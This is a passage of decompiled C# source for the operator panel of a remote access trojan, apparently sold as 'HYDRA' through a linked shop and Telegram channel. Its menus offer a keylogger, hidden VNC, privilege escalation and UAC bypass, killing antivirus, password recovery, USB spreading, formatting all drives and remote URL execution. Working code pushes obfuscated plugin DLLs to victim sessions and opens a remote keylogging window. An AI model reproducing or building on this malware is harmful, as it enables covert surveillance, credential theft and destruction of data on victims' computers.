			toolStripMenuItem20.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem20.Name = "remoteFileToolStripMenuItem";
			toolStripMenuItem20.Size = new Size(180, 22);
			toolStripMenuItem20.Text = "File Management";
			toolStripMenuItem21.BackColor = Color.FromArgb(40, 40, 40);
			toolStripMenuItem21.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem21.Name = "remoteFileToolStripMenuItem2";
			toolStripMenuItem21.Size = new Size(130, 22);
			toolStripMenuItem21.Text = "File Management";
			toolStripMenuItem21.Click += new EventHandler(remoteFileToolStripMenuItem2_Click);
			toolStripMenuItem22.BackColor = Color.FromArgb(40, 40, 40);
			toolStripMenuItem22.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem22.Name = "pluginToolStripMenuItem2";
			toolStripMenuItem22.Size = new Size(130, 22);
			toolStripMenuItem22.Text = "Upload plugin";
			toolStripMenuItem23.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem24, toolStripMenuItem25 });
			toolStripMenuItem23.Font = new Font("Century Gothic", 10.5f);
			toolStripMenuItem23.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem23.Name = "remoteDesktopToolStripMenuItem";
			toolStripMenuItem23.Size = new Size(180, 22);
			toolStripMenuItem23.Text = "Remote Desktop";
			toolStripMenuItem24.BackColor = Color.FromArgb(30, 30, 30);
			toolStripMenuItem24.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem24.Name = "remoteSubDesktopToolStripMenuItem";
			toolStripMenuItem24.Size = new Size(130, 22);
			toolStripMenuItem24.Text = "Remote Desktop";
			toolStripMenuItem24.Click += new EventHandler(remoteDesktopToolStripMenuItem_Click);
			toolStripMenuItem25.BackColor = Color.FromArgb(30, 30, 30);
			toolStripMenuItem25.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem25.Name = "desktopPluginToolStripMenuItem";
			toolStripMenuItem25.Size = new Size(130, 22);
			toolStripMenuItem25.Text = "Upload plugin";
			toolStripMenuItem25.Click += new EventHandler(remoteDesktopPluginToolStripMenuItem_Click);
			toolStripMenuItem26.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem27, toolStripMenuItem28 });
			toolStripMenuItem26.Font = new Font("Century Gothic", 10.5f);
			toolStripMenuItem26.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem26.Name = "remoteDesktopToolStripMenuItem";
			toolStripMenuItem26.Size = new Size(180, 22);
			toolStripMenuItem26.Text = "Remote hVNC";
			toolStripMenuItem27.BackColor = Color.FromArgb(30, 30, 30);
			toolStripMenuItem27.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem27.Name = "remoteSubDesktopToolStripMenuItem";
			toolStripMenuItem27.Size = new Size(130, 22);
			toolStripMenuItem27.Text = "Remote hVNC";
			toolStripMenuItem27.Click += new EventHandler(remoteHVNCToolStripMenuItem_Click);
			toolStripMenuItem28.BackColor = Color.FromArgb(30, 30, 30);
			toolStripMenuItem28.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem28.Name = "desktopPluginToolStripMenuItem";
			toolStripMenuItem28.Size = new Size(130, 22);
			toolStripMenuItem28.Text = "Upload plugin";
			toolStripMenuItem28.Click += new EventHandler(uploadPluginToolStripMenuItem5_Click);
			toolStripMenuItem29.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem30, toolStripMenuItem31 });
			toolStripMenuItem29.Font = new Font("Century Gothic", 10.5f);
			toolStripMenuItem29.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem29.Name = "remoteToolStripMenuItem";
			toolStripMenuItem29.Size = new Size(180, 22);
			toolStripMenuItem29.Text = "Key logger";
			toolStripMenuItem30.BackColor = Color.FromArgb(30, 30, 30);
			toolStripMenuItem30.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem30.Name = "remoteKeyboardToolStripMenuItem";
			toolStripMenuItem30.Size = new Size(130, 22);
			toolStripMenuItem30.Text = "Key logger";
			toolStripMenuItem30.Click += new EventHandler(remoteKeyboardToolStripMenuItem_Click);
			toolStripMenuItem31.BackColor = Color.FromArgb(30, 30, 30);
			toolStripMenuItem31.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem31.Name = "puginToolStripMenuItem";
			toolStripMenuItem31.Size = new Size(130, 22);
			toolStripMenuItem31.Text = "Upload plugin";
			toolStripMenuItem31.Click += new EventHandler(puginToolStripMenuItem_Click);
			toolStripMenuItem32.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem33, toolStripMenuItem34 });
			toolStripMenuItem32.Font = new Font("Century Gothic", 10.5f);
			toolStripMenuItem32.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem32.Name = "elevationOfPrivilegeToolStripMenuItem";
			toolStripMenuItem32.Size = new Size(180, 22);
			toolStripMenuItem32.Text = "Privilege escalation";
			toolStripMenuItem33.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem33.Name = "privilegeEscalationToolStripMenuItem";
			toolStripMenuItem33.Size = new Size(130, 22);
			toolStripMenuItem33.Text = "Privilege escalation";
			toolStripMenuItem33.Click += new EventHandler(privilegeEscalationToolStripMenuItem_Click);
			toolStripMenuItem34.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem34.Name = "escalationPluginToolStripMenuItem";
			toolStripMenuItem34.Size = new Size(130, 22);
			toolStripMenuItem34.Text = "Upload plugin";
			toolStripMenuItem34.Click += new EventHandler(escalationPluginToolStripMenuItem_Click);
			toolStripMenuItem35.DropDownItems.AddRange(new ToolStripItem[2] { toolStripMenuItem36, toolStripMenuItem37 });
			toolStripMenuItem35.Font = new Font("Century Gothic", 10.5f);
			toolStripMenuItem35.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem35.Name = "远程端口代理ToolStripMenuItem";
			toolStripMenuItem35.Size = new Size(180, 22);
			toolStripMenuItem35.Text = "Proxy port";
			toolStripMenuItem36.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem36.Name = "端口代理ToolStripMenuItem";
			toolStripMenuItem36.Size = new Size(130, 22);
			toolStripMenuItem36.Text = "Proxy port";
			toolStripMenuItem36.Click += new EventHandler(PortproxyToolStripMenuItem_Click);
			toolStripMenuItem37.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem37.Name = "上传插件ToolStripMenuItem";
			toolStripMenuItem37.Size = new Size(130, 22);
			toolStripMenuItem37.Text = "Upload plugin";
			toolStripMenuItem37.Click += new EventHandler(UploadpluginToolStripMenuItem_Click);
			toolStripMenuItem38.DropDownItems.AddRange(new ToolStripItem[5] { toolStripMenuItem39, toolStripMenuItem40, toolStripMenuItem5, toolStripMenuItem41, toolStripMenuItem42 });
			toolStripMenuItem38.Font = new Font("Century Gothic", 10.5f);
			toolStripMenuItem38.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem38.Name = "其他功能ToolStripMenuItem";
			toolStripMenuItem38.Size = new Size(180, 22);
			toolStripMenuItem38.Text = "Other functions";
			toolStripMenuItem39.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem39.Name = "admin权限ToolStripMenuItem";
			toolStripMenuItem39.Size = new Size(270, 22);
			toolStripMenuItem39.Text = "Admin Permissions";
			toolStripMenuItem39.Click += new EventHandler(adminpermissionsToolStripMenuItem_Click);
			toolStripMenuItem40.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem40.Name = "close360ToolStripMenuItem";
			toolStripMenuItem40.Size = new Size(270, 22);
			toolStripMenuItem40.Text = "Kill 360 safely";
			toolStripMenuItem40.Click += new EventHandler(close360ToolStripMenuItem_Click);
			toolStripMenuItem41.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem41.Name = "clientUpdateToolStripMenuItem";
			toolStripMenuItem41.Size = new Size(270, 22);
			toolStripMenuItem41.Text = "Remote client update";
			toolStripMenuItem41.Click += new EventHandler(clientUpdateToolStripMenuItem_Click);
			toolStripMenuItem42.ForeColor = Color.FromArgb(190, 190, 190);
			toolStripMenuItem42.Name = "uploadOtherToolStripMenuItem";
			toolStripMenuItem42.Size = new Size(270, 22);
			toolStripMenuItem42.Text = "Upload plugin";
			toolStripMenuItem42.Click += new EventHandler(uploadOtherToolStripMenuItem_Click);
			toolStripMenuItem43.Name = "remoteFileToolStripMenuItem1";
			toolStripMenuItem43.Size = new Size(32, 19);
			toolStripMenuItem44.Name = "pluginToolStripMenuItem1";
			toolStripMenuItem44.Size = new Size(32, 19);
			toolStripMenuItem45.Name = "clientInfoToolStripMenuItem";
			toolStripMenuItem45.Size = new Size(32, 19);
			toolStripMenuItem46.Name = "modifyGroupToolStripMenuItem";
			toolStripMenuItem46.Size = new Size(32, 19);
			contextMenuStrip.Renderer = new MyMenuRender();
			return contextMenuStrip;
		}

		private void ListView1_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
		{
			using SolidBrush brush = new SolidBrush(Color.White);
			using SolidBrush brush2 = new SolidBrush(Color.FromArgb(226, 28, 71));
			e.DrawBackground();
			e.Graphics.FillRectangle(brush, e.Bounds);
			e.Graphics.DrawRectangle(new Pen(Color.Black), new Rectangle(e.Bounds.Left - 1, e.Bounds.Top - 1, e.Bounds.Width, e.Bounds.Height));
			Font font = new Font("Italic", 8.25f, FontStyle.Bold);
			RectangleF layoutRectangle = new RectangleF(e.Bounds.Left, e.Bounds.Top + 3, e.Bounds.Width, e.Bounds.Height - 3);
			e.Graphics.DrawString(e.Header.Text, font, brush2, layoutRectangle);
		}

		private void ListView1_DrawItem(object sender, DrawListViewItemEventArgs e)
		{
			if (!e.Item.Selected)
			{
				e.DrawDefault = true;
			}
		}

		private void ListView2_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
		{
			using SolidBrush brush = new SolidBrush(Color.White);
			using SolidBrush brush2 = new SolidBrush(HYDRAUI.m_ForeColor);
			e.DrawBackground();
			e.Graphics.FillRectangle(brush, e.Bounds);
			e.Graphics.DrawRectangle(new Pen(Color.Black), new Rectangle(e.Bounds.Left - 1, e.Bounds.Top - 1, e.Bounds.Width, e.Bounds.Height));
			Font font = new Font("Century Gothic", 9f, FontStyle.Bold);
			RectangleF layoutRectangle = new RectangleF(e.Bounds.Left, e.Bounds.Top + 2, e.Bounds.Width, e.Bounds.Height - 2);
			e.Graphics.DrawString(e.Header.Text, font, brush2, layoutRectangle);
		}

		private void ListView2_DrawItem(object sender, DrawListViewItemEventArgs e)
		{
			if (!e.Item.Selected)
			{
				e.DrawDefault = true;
			}
		}

		private void ListView2_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
		{
			using SolidBrush brush = new SolidBrush(Color.FromArgb(150, 150, 150));
			if (e.Item.Selected)
			{
				e.Graphics.FillRectangle(brush, e.Bounds);
				TextRenderer.DrawText(e.Graphics, e.SubItem.Text, new Font("Century Gothic", 8f, FontStyle.Regular), new Point(e.Bounds.Left + 3, e.Bounds.Top + 2), Color.FromArgb(17, 17, 17));
			}
			else
			{
				e.DrawDefault = true;
			}
		}

		private void ListView1_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
		{
			using SolidBrush brush = new SolidBrush(Color.FromArgb(150, 150, 150));
			if (e.Item.Selected)
			{
				e.Graphics.FillRectangle(brush, e.Bounds);
				TextRenderer.DrawText(e.Graphics, e.SubItem.Text, new Font("Century Gothic", 8f, FontStyle.Regular), new Point(e.Bounds.Left + 3, e.Bounds.Top + 2), Color.FromArgb(17, 17, 17));
			}
			else
			{
				e.DrawDefault = true;
			}
		}

		private void guna2ControlBox3_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		private void chkSubitemIcons_CheckedChanged(object sender, EventArgs e)
		{
		}

		private void btnPaste_Click(object sender, EventArgs e)
		{
		}

		private void btnAbout_Click(object sender, EventArgs e)
		{
		}

		private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
		{
		}

		private void btnSetting_Click(object sender, EventArgs e)
		{
		}

		private void siticoneChip1_Click(object sender, EventArgs e)
		{
		}

		private void Guna2Button1_Click(object sender, EventArgs e)
		{
		}

		public void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				if (base.WindowState == FormWindowState.Normal)
				{
					base.WindowState = FormWindowState.Minimized;
					base.Hide();
				}
				else if (base.WindowState == FormWindowState.Minimized)
				{
					base.Show();
					base.WindowState = FormWindowState.Normal;
					base.Activate();
				}
			}
		}

		private void guna2Button1_Click(object sender, EventArgs e)
		{
		}

		private void btnTutorials_Click(object sender, EventArgs e)
		{
			Process.Start("https://www.youtube.com/channel/UC8Rlyu9K1JgS8vxYdtDuhng");
		}

		public async Task LODAGUI(string resource, string pluginname)
		{
			await this.awaituploadplugins(resource, pluginname);
		}

		internal async Task awaituploadplugins(string resource, string pluginname)
		{
			Task.Run(delegate
			{
				this.UploadPlugin(resource, pluginname);
			}).Wait();
		}

		public void UploadPlugin(string PathPlugin, string pluginname)
		{
			try
			{
				lock (this.PluginStatus)
				{
					if (!this.GetSelectedSession(out var tcs))
					{
						return;
					}
					this.ClientMessage(pluginname, null);
					List<byte> list = new List<byte>();
					list.AddRange(GZip.Compress(Convert.FromBase64String(File.ReadAllText(Application.StartupPath + "\\Plugin\\" + PathPlugin.Replace(".dll", ".Key")).Replace(":", "A").Replace("-", "o")
						.Replace("*", "O"))));
					uint num = 102400u;
					uint num2 = 0u;
					int value = list.Count;
					while (list.Count > 15000)
					{
						tcs.Client_Send(DataType.UploadPlugin, list.GetRange(0, 15000).ToArray());
						list.RemoveRange(0, 15000);
						num2 += 15000;
						if (num2 > num)
						{
							Task.Delay(500);
							num2 = 0u;
						}
					}
					tcs.Client_Send(DataType.UploadPlugin, list.ToArray());
					tcs.Client_Send(DataType.UploadPluginEnd, BitConverter.GetBytes(value));
				}
			}
			catch (Exception ex)
			{
				MsgBox.Show(ex.Message);
			}
		}

		private void DoLoadGui(string resource, string pluginname)
		{
			using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource);
			using StreamReader streamReader = new StreamReader(stream);
			string text = streamReader.ReadToEnd();
			try
			{
				lock (this.PluginStatus)
				{
					if (!this.GetSelectedSession(out var tcs))
					{
						return;
					}
					this.ClientMessage(pluginname, null);
					List<byte> list = new List<byte>();
					list.AddRange(GZip.Compress(Convert.FromBase64String(text.Replace(":", "A").Replace("-", "o").Replace("*", "O"))));
					uint num = 102400u;
					uint num2 = 0u;
					int value = list.Count;
					while (list.Count > 15000)
					{
						tcs.Client_Send(DataType.UploadPlugin, list.GetRange(0, 15000).ToArray());
						list.RemoveRange(0, 15000);
						num2 += 15000;
						if (num2 > num)
						{
							Task.Delay(500);
							num2 = 0u;
						}
					}
					tcs.Client_Send(DataType.UploadPlugin, list.ToArray());
					tcs.Client_Send(DataType.UploadPluginEnd, BitConverter.GetBytes(value));
				}
			}
			catch (Exception ex)
			{
				MsgBox.Show(ex.Message);
			}
		}

		private async void offlineKeyLoggerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			await Task.Run(async delegate
			{
				this.puginToolStripMenuItem_Click(new object(), new EventArgs());
			});
			List<Thread> list = new List<Thread>();
			try
			{
				TcpClientSession tcs;
				string address;
				list.Add(new Thread((ThreadStart)delegate
				{
					Thread.Sleep(3000);
					try
					{
						if (this.GetSelectedSession(out tcs))
						{
							address = tcs._remoteEndPoint.Address.ToString();
							if ((Remote_Keylogger)Application.OpenForms["Remote Keyboard :" + address] == null)
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									try
									{
										Application.Run(new Remote_Keylogger("\\\\" + address + " - Remote Keyboard Manager(Keylogging is turned on)", tcs)
										{
											Name = "Remote Keyboard :" + address
										});
									}
									catch
									{
									}
								});
								thread.SetApartmentState(ApartmentState.STA);
								thread.Start();
							}
						}
					}
					catch
					{
					}
				}));
				foreach (Thread item in list)
				{
					item.Start();
				}
			}
			catch
			{
			}
		}

		private void pictureBox4_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		private void iconmaximizar_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Maximized;
			this.iconrestaurar.Visible = true;
			this.iconmaximizar.Visible = false;
		}

		private void iconrestaurar_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Normal;
			this.iconrestaurar.Visible = false;
			this.iconmaximizar.Visible = true;
		}

		private void pictureBox1_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		private void buttonspanel_MouseLeave(object sender, EventArgs e)
		{
		}

		private bool MouseIsOverControl(Panel buttonspanel)
		{
			return buttonspanel.ClientRectangle.Contains(buttonspanel.PointToClient(Cursor.Position));
		}

		private void buttonspanel_CursorChanged(object sender, EventArgs e)
		{
		}

		private void Guna2ToggleSwitch1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.chkLogs.Switched)
			{
				this.bunifuTransition2.ShowSync(this.listView2);
			}
			else
			{
				this.bunifuTransition2.HideSync(this.listView2);
			}
		}

		private void toolStripMenuItem7_Click(object sender, EventArgs e)
		{
			if (this.listView2.SelectedItems.Count == 0)
			{
				return;
			}
			string text = string.Empty;
			foreach (ListViewItem selectedItem in this.listView2.SelectedItems)
			{
				text = selectedItem.SubItems.Cast<ListViewItem.ListViewSubItem>().Aggregate(text, (string current, ListViewItem.ListViewSubItem lvs) => current + lvs.Text + " : ");
				text = text.Remove(text.Length - 3);
				text += "\r\n";
			}
			ClipboardHelper.SetClipboardText(text);
		}

		private void metroSetSwitch1_SwitchedChanged(object sender)
		{
		}

		private void metroSetSwitch2_SwitchedChanged(object sender)
		{
			if (this.chkLogs.Switched)
			{
				this.bunifuTransition2.ShowSync(this.listView2);
			}
			else
			{
				this.bunifuTransition2.HideSync(this.listView2);
			}
		}

		private void btnBuilder_Click(object sender, EventArgs e)
		{
			using FrmBuilder frmBuilder = new FrmBuilder();
			frmBuilder.ShowDialog();
		}

		public void openChildForm(Form frm)
		{
			foreach (Control control in this.hvncpanel.Controls)
			{
				if (control is Form)
				{
					((Form)control).Hide();
				}
			}
			frm.TopLevel = false;
			frm.Parent = this.hvncpanel;
			frm.FormBorderStyle = FormBorderStyle.None;
			frm.Dock = DockStyle.Fill;
			frm.Show();
		}

		private void hvncPanelToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.bunifuTransition1.HideSync(this.bunifuPanel2);
			this.customLabel1.Text = "Clients";
			this.openChildForm(HYDRAUI.Aariel);
		}

		private void injectToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void btnClients_Click(object sender, EventArgs e)
		{
			this.bunifuTransition1.ShowSync(this.bunifuPanel2);
		}

		private void systemInfoToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.GetSelectedSession(out var tcs))
				{
					tcs.Client_Send(DataType.InformationType, Encoding.UTF8.GetBytes("info"));
				}
			}
			catch
			{
			}
		}

		private void btnShop_Click(object sender, EventArgs e)
		{
			Process.Start("https://shophydra.sellix.io/");
		}

		private void btnTelegram_Click(object sender, EventArgs e)
		{
			Process.Start("https://t.me/HYDRAREMOTE");
		}

		private void btnTuts_Click(object sender, EventArgs e)
		{
			MsgBox.Show("Coming soon.");
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
																																													this.components = new System.ComponentModel.Container();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges2 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges3 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges4 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges5 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges6 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges7 = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			Bunifu.UI.WinForms.BunifuAnimatorNS.Animation animation = new Bunifu.UI.WinForms.BunifuAnimatorNS.Animation();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(NeonRat.Forms.HYDRAUI));
			Bunifu.UI.WinForms.BunifuAnimatorNS.Animation animation2 = new Bunifu.UI.WinForms.BunifuAnimatorNS.Animation();
			this.Guna2Elipse1 = new Guna2Elipse(this.components);
			this.Guna2PictureBox1 = new Guna2PictureBox();
			this.guna2ContextMenuStrip1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
			this.systemMassageToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.GuiToUnnistall = new System.Windows.Forms.ToolStripMenuItem();
			this.disconectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.restartConnectionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.remoteLogoutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.remoteRestartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.remoteShutDownToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.injectPluginToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.remoteClientUpdateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.systemInfoToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.TcpToGui = new System.Windows.Forms.ToolStripMenuItem();
			this.remoteTerminalToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.remoteTerminalToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			this.uploadPluginToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.proccessManagementToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.processManagementToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.uploadPluginToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			this.fileManagementToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.fileManagementToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			this.uploadPluginToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
			this.hvncDesktopBrowsersAppsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.hvncPanelToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.injectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.remoteDesktopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.remoteViewToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.uploadPluginToolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
			this.keyLoggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.keyLoggerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			this.offlineKeyLoggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.uploadPluginToolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
			this.privilegeEscalationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.directUacToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.windows10ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.windows8ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.windows7ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.privilegeEscalationToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			this.getAdminToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.uploadPluginToolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
			this.activateUACPluginToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.activateOtherPluginToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.startUpManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.startupManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			this.uploadPluginToolStripMenuItem8 = new System.Windows.Forms.ToolStripMenuItem();
			this.extraToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.killWDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.kill360SafetyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.uploadPluginToolStripMenuItem11 = new System.Windows.Forms.ToolStripMenuItem();
			this.remoteFunToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.monitorOnoffToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.onToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.offToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.openCloseCdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.openToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.closeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.showHideTaskbarToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.showToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.hideToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.showHideStartBtnToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.showToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			this.hideToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			this.startStopExplorerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.startToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.stopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.showHideClockToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.showToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			this.hideToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			this.showHideTrayToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.showToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
			this.hideToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
			this.showHideDesktopIconsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			this.hideRestoreAllWindowsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.restoreToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.hideToolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
			this.enableDisableTaskmgrToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.enableToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.disableToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.enableDisableRegeditToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.enableToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			this.disableToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			this.showHideMouseToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.toolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
			this.toolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
			this.disableuacToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.toolStripMenuItem5 = new System.Windows.Forms.ToolStripMenuItem();
			this.toolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
			this.passwordRecoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.webHistoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.webHistoryAllToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.getLogsLinkToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.activateSTPluginToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.remoteSystemManagementToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.executionPolicyAdminToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.unrestrictedToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.remoteSignedToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.formatAllDrivesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.netFrameworksAdminToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.uSBSpreadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.killerRegwindowsUnusableToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.sendEmailToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.remoteURLExecutionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.getTheClipboardToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
